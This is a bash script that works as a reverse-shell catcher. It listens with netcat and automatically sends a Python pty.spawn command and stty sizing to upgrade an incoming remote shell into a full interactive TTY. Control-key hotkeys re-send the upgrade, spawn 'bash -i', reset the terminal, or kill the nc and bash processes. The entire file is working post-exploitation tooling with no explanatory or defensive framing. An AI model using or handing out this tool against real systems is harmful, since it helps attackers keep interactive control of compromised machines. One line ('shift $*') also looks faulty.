#!/bin/bash

size=( $(stty -a|grep -Po '(rows|columns) \K[^;]+') )
rows=${size[0]:-30}
cols=${size[1]:-50}



function killtree() {
    sig=$1
    nameprocess=$2
    for pid in $(pstree -ncp $$ |& perl -nle 'm/$nameprocess\((\d+)\)/; print $1' | uniq);
    do
	kill -s $sig $pid
    done
}

function ioctrlTTY() {
    cmd=0
    while [ 1 ] ; do
	key=$(dd of=/proc/self/fd/1 bs=1 count=1 2>/dev/null)
	if [ "$cmd" = "1" ] ; then
	    # ctrl q
	    if [ $(echo "$key") = $(echo -e "\x11") ] ; then
		killtree 9 cat
		killtree 9 nc
		sleep 10
		reset
		killtree 9 bash
		echo 'Bye !' >/proc/$$/fd/2
		exit 0
	    #ctrl r
	    elif [[ $(echo "$key") == $(echo -e "\x12") ]] ; then
		echo "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
		echo "stty rows $rows columns $cols"
	    # ctrl s
	    elif [[ $(echo "$key") == $(echo -e "\x13") ]] ; then
		reset
		bash -i
		stty raw -echo
	    # ctrl t
	    elif [[ $(echo "$key") == $(echo -e "\x14") ]] ; then
		reset
		echo "TTY has been reset" >/proc/$$/fd/2
	    fi
	    cmd=0
	fi
	
	if [[ $(echo "$key") == $(echo -e "\x10") ]] ; then
	    cmd="1"
	    continue
	fi

	if [ -z "$key" ]; then
	    printf "\n"
	    continue
	fi
	   
	printf "%c" "$key"
    done
}

shift $*
stty raw -echo
(echo "python -c 'import pty; pty.spawn(\"/bin/bash\")'"; echo "stty rows $rows columns $cols";  cat  ) | ioctrlTTY  | nc -nvlp $*
reset
